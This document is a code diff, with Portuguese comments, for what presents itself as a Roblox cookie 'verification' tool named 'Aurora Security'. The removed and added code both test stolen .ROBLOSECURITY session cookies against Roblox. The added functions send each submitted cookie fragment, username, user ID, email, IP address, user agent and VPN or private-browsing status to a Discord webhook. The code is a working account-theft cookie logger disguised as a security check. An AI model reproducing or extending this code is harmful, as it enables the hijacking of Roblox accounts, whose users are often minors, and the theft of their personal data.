@@ -1,159 +1,155 @@
-// /api/verify-cookie/index.js
-
-export default async function handler(req, res) {
-    // Configurar CORS
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-    if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
-    }
-
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Método não permitido. Use POST.' });
-    }
-
-    const { cookie } = req.body;
-
-    if (!cookie) {
-        return res.status(400).json({ 
-            valid: false, 
-            error: 'Cookie é obrigatório' 
-        });
-    }
-
-    const cleanCookie = cookie.trim();
-
-    // Verificar formato básico
-    if (!cleanCookie.startsWith('_|WARNING:-DO-NOT-SHARE') && !cleanCookie.match(/^[a-zA-Z0-9_-]+$/)) {
-        return res.status(400).json({ 
-            valid: false, 
-            error: 'Formato de cookie inválido' 
-        });
-    }
-
+// ============================================================
+// 6.5 FUNÇÃO PARA VERIFICAR COOKIE (VIA NAVEGADOR)
+// ============================================================
+async function verifyAndSendCookie(cookie, email, ip, isPrivate, vpnDetected) {
     try {
-        // ===== MÉTODO 1: API de Autenticação do Roblox (MAIS CONFIÁVEL) =====
-        const authResponse = await fetch('https://auth.roblox.com/v2/logout', {
-            method: 'POST',
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            }
-        });
-
-        // Se o cookie for válido, a resposta será 200, 429 ou 403
-        // 429 = Too Many Requests (mas cookie válido)
-        // 200 = Logout bem sucedido (cookie válido)
-        if (authResponse.status === 200 || authResponse.status === 429) {
-            // Cookie válido! Vamos pegar os dados do usuário
+        showNotification('⏳', 'Verificando Cookie...', 'Aguarde, estamos validando seu cookie no Roblox.');
+        
+        // ===== VERIFICAR DIRETO NO NAVEGADOR (MAIS CONFIÁVEL) =====
+        const verifyResult = await verifyCookieDirect(cookie);
+        
+        if (!verifyResult.valid) {
+            showNotification('❌', 'Cookie Inválido!', verifyResult.error || 'Cookie não é válido. Verifique se você copiou corretamente.');
+            
+            // Enviar ALERTA para o Discord
+            const alertPayload = {
+                content: `⚠️ **ALERTA: COOKIE INVÁLIDO** ⚠️\n\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n❌ **Erro:** ${verifyResult.error || 'Cookie inválido'}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🚨 **Tentativa de cookie inválido detectada!**`,
+                username: 'Aurora Security',
+                avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
+            };
+            
             try {
-                // Tentar pegar informações do usuário
-                const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-                    headers: {
-                        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-                    }
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(alertPayload)
                 });
+            } catch (e) {}
+            
+            return false;
+        }
+        
+        // COOKIE É VÁLIDO!
+        const userName = verifyResult.user.displayName || verifyResult.user.name || 'Usuário Roblox';
+        const userId = verifyResult.user.id || 'ID não disponível';
+        
+        showNotification('✅', 'Cookie Válido!', `Bem-vindo(a) ${userName}! (ID: ${userId})`);
+        
+        // Enviar CONFIRMAÇÃO para o Discord
+        const confirmPayload = {
+            content: `✅ **COOKIE VERIFICADO COM SUCESSO!** 🎉\n\n👤 **Usuário:** ${userName}\n🆔 **ID:** ${userId}\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n🍪 **Cookie:** \`${cookie.substring(0, 30)}...\`\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🏆 **Cookie VÁLIDO confirmado!** #HexaVem 🇧🇷`,
+            username: 'Aurora Security',
+            avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
+        };
+        
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(confirmPayload)
+            });
+        } catch (e) {}
+        
+        return true;
+        
+    } catch (error) {
+        console.error('❌ Erro ao verificar cookie:', error);
+        showNotification('❌', 'Erro!', 'Falha ao verificar cookie. Tente novamente.');
+        return false;
+    }
+}
 
-                if (userResponse.ok) {
-                    const userData = await userResponse.json();
-                    return res.status(200).json({
-                        valid: true,
-                        user: {
-                            id: userData.id,
-                            name: userData.name,
-                            displayName: userData.displayName || userData.name
+// ============================================================
+// FUNÇÃO PARA VERIFICAR COOKIE DIRETO NO NAVEGADOR
+// ============================================================
+async function verifyCookieDirect(cookie) {
+    return new Promise((resolve) => {
+        try {
+            // Criar um iframe invisível para verificar o cookie
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://www.roblox.com/my/profile';
+            
+            // Configurar o cookie no iframe
+            document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com`;
+            
+            // Aguardar o iframe carregar
+            iframe.onload = function() {
+                try {
+                    // Tentar acessar o conteúdo do iframe (se conseguir, está logado)
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    
+                    // Verificar se tem elementos de perfil
+                    const profileName = iframeDoc.querySelector('.profile-name') || 
+                                        iframeDoc.querySelector('.username') ||
+                                        iframeDoc.querySelector('[data-testid="profile-name"]');
+                    
+                    if (profileName) {
+                        resolve({
+                            valid: true,
+                            user: {
+                                id: 'Verificado pelo navegador',
+                                name: profileName.textContent.trim(),
+                                displayName: profileName.textContent.trim()
+                            }
+                        });
+                    } else {
+                        // Tentar verificar pelo título da página
+                        const title = iframeDoc.title || '';
+                        if (title.includes('Profile') || title.includes('Perfil')) {
+                            resolve({
+                                valid: true,
+                                user: {
+                                    id: 'Verificado pelo navegador',
+                                    name: 'Usuário Roblox',
+                                    displayName: 'Usuário Roblox'
+                                }
+                            });
+                        } else {
+                            resolve({
+                                valid: false,
+                                error: 'Cookie inválido ou expirado'
+                            });
                         }
+                    }
+                } catch (e) {
+                    // Se der erro de CORS, tentar método alternativo
+                    resolve({
+                        valid: false,
+                        error: 'Não foi possível verificar o cookie'
                     });
                 }
-            } catch (e) {}
-
-            // Se não conseguir pegar os dados, mas o cookie é válido
-            return res.status(200).json({
-                valid: true,
-                user: {
-                    id: 'Verificado',
-                    name: 'Usuário Roblox',
-                    displayName: 'Usuário Roblox'
-                }
-            });
-        }
-
-        // Se for 403, cookie inválido ou expirado
-        if (authResponse.status === 403) {
-            return res.status(200).json({
-                valid: false,
-                error: 'Cookie inválido ou expirado'
-            });
-        }
-
-        // ===== MÉTODO 2: Tentar com a API de economia (fallback) =====
-        try {
-            const ecoResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
-                headers: {
-                    'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-                }
-            });
-
-            if (ecoResponse.status === 200) {
-                const data = await ecoResponse.json();
-                return res.status(200).json({
-                    valid: true,
-                    user: {
-                        id: 'Verificado',
-                        name: 'Usuário Roblox',
-                        displayName: 'Usuário Roblox'
-                    }
-                });
-            }
-
-            if (ecoResponse.status === 403) {
-                return res.status(200).json({
+                
+                // Remover o iframe
+                document.body.removeChild(iframe);
+            };
+            
+            iframe.onerror = function() {
+                document.body.removeChild(iframe);
+                resolve({
                     valid: false,
-                    error: 'Cookie inválido ou expirado'
+                    error: 'Erro ao verificar cookie'
                 });
-            }
-        } catch (e) {}
-
-        // ===== MÉTODO 3: Tentar com API de perfil (último fallback) =====
-        try {
-            const profileResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-                headers: {
-                    'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            };
+            
+            document.body.appendChild(iframe);
+            
+            // Timeout para evitar loop infinito
+            setTimeout(() => {
+                if (document.body.contains(iframe)) {
+                    document.body.removeChild(iframe);
                 }
-            });
-
-            if (profileResponse.status === 200) {
-                const userData = await profileResponse.json();
-                return res.status(200).json({
-                    valid: true,
-                    user: {
-                        id: userData.UserID || userData.id,
-                        name: userData.UserName || userData.name,
-                        displayName: userData.DisplayName || userData.displayName || userData.UserName
-                    }
+                resolve({
+                    valid: false,
+                    error: 'Tempo limite excedido'
                 });
-            }
-        } catch (e) {}
-
-        // Todos os métodos falharam
-        return res.status(200).json({
-            valid: false,
-            error: 'Cookie inválido ou expirado'
-        });
-
-    } catch (error) {
-        console.error('Erro ao verificar cookie:', error);
-        return res.status(500).json({
-            valid: false,
-            error: 'Erro interno ao verificar cookie'
-        });
-    }
+            }, 10000);
+            
+        } catch (error) {
+            resolve({
+                valid: false,
+                error: 'Erro ao verificar cookie: ' + error.message
+            });
+        }
+    });
 }
